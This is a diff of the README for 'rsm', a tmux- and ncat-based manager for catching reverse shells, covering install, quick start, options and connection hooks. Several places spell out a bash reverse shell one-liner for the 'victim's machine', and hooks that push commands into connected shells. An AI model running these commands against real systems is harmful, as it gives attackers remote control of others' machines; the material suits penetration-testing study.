@@ -5,84 +5,32 @@ A simple reverse shell manager using `tmux` and `ncat`.
 ## Install
 
 ```shell
-curl https://raw.githubusercontent.com/djosix/rsm/master/rsm > /usr/local/bin/rsm
+BIN_PATH=/usr/local/bin/rsm
+curl -o "$BIN_PATH" https://raw.githubusercontent.com/djosix/rsm/master/rsm
+chmod +x "$BIN_PATH"
 ```
 
 ## Quick Start
 
-Listening on a port and attach to the session. (rsm creates a separated tmux socket, so it will not mess up your tmux sessions)
+1. Listen on a port and attach to rsm tmux session:
+    ```shell
+    rsm 14641
+    ```
+    > `rsm` creates it's own tmux socket, so it will not mess up with your default tmux sessions.
 
-```shell
-rsm 14641
-```
-
-On victim's machine, launch a reverse shell. Once the victim connects back, rsm will create a tmux window handling the TCP connection. The only thing you need to do is switching to that window in the rsm tmux session.
-
-```shell
-bash -c 'bash -i >& /dev/tcp/127.0.0.1/14641 0<&1'
-```
-
-If a rsm session is detached, you can attach to it using this:
-
-```shell
-rsm attach
-```
-
-Stop the server and cleanup. If no port is specified, rsm will stop all listening sessions.
-
-```shell
-rsm stop [port1] [port2] [...]
-```
-
-## Settings
-
-Hooking the client connection, you can use `$IP` and `$PORT` in your command, which correspond to the client:
-
-```shell
-export RSM_HOOK='echo Hello, you are $IP:$PORT'
-rsm d 12345
-
-nc 127.0.0.1 12345
-```
-
-Client gets:
-
-```
-Hello, you are 127.0.0.1:50522
-```
-
-Injecting command to the reverse shell. (stdout of the hook command will be sent to the client socket, stderr will be printed out)
-
-```shell
-export RSM_HOOK='echo "echo hehe > ~/hacked"'
-rsm d 12345
-
-bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1'
-cat ~/hacked # hehe
-```
-
-Executing a command when rsm starts:
-
-```shell
-export RSM_WITH='ncat -lk 12345 -c "cat > test.txt"'
-rsm d 22222
-```
-
-Other settings:
-
-```shell
-export RSM_DIR=$HOME/.rsm   # where rsm sockets will be
-export RSM_MAX_CONN=32      # maximum number of connections
-export RSM_MAX_RECV=32      # maximum receiving mega-bytes
-rsm 13370
-```
+2. On victim's machine, launch a reverse shell:
+    ```shell
+    bash -c 'bash -i >& /dev/tcp/127.0.0.1/14641 0<&1'
+    ```
+3. Once it connects back to the `rsm` port, `rsm` will create a new tmux window to handle the TCP connection. You can simply switch to that window and start typing commands.
 
 ## Usage
 
-```shell
-$ rsm help
-Usage:
+`$ rsm --help`
 
+```
+Usage: COMMAND [OPTIONS]
+Commands:
     rsm PORT            Start a reverse shell listener on PORT
     rsm d[etached] PORT Start a detached reverse shell listener on PORT
     rsm l[ist]          List active rsm listeners
@@ -95,13 +43,33 @@ Usage:
     rsm c[lean] PORT    Clean sockets for PORT
     rsm c[lean]         Clean all sockets
     rsm h[elp]          Show this help message
+Options:
+    -d, --dir DIR       Where the rsm sockets be stored (default: /tmp/.rsm)
+    -n, --max-conn N    Maximum number of connections (default: 128)
+    -r, --max-recv N    Maximum receiving MB (default: 64)
+    -c, --hook CMD      Command to eval when a client connects
+    -w, --with CMD      Command to eval when rsm starts
+    --ncat-flags FLAGS  Additional command line flags for ncat
+    --tmux-flags FLAGS  Additional command line flags for tmux
+    -h, --help          Show this help message
+```
 
-    Configurable Variables:
+## Connection Hooks
 
-        RSM_DIR         Where the rsm sockets be stored (default: /tmp/.rsm)
-        RSM_MAX_CONN    Maximum number of connections (default: 128)
-        RSM_MAX_RECV    Maximum receiving MB (default: 64)
-        RSM_HOOK        Command to eval when a client connects
-        RSM_WITH        Command to eval when rsm starts
+You are able to run custom command to handle a client connection:
 
+```shell
+rsm detached 12345 --hook 'echo "Hello, you are from ${IP}:${PORT}!"; exit'
+
+ncat 127.0.0.1 12345
+# Hello, you are from 127.0.0.1:50920!
+```
+
+With this feature, you can run commands automatically when a reverse shell connects back:
+
+```shell
+rsm detached 12345 --hook "echo 'echo SomeContent > \$HOME/SomeFile; exit'; exit"
+
+bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1'
+cat ~/SomeFile # SomeContent
 ```
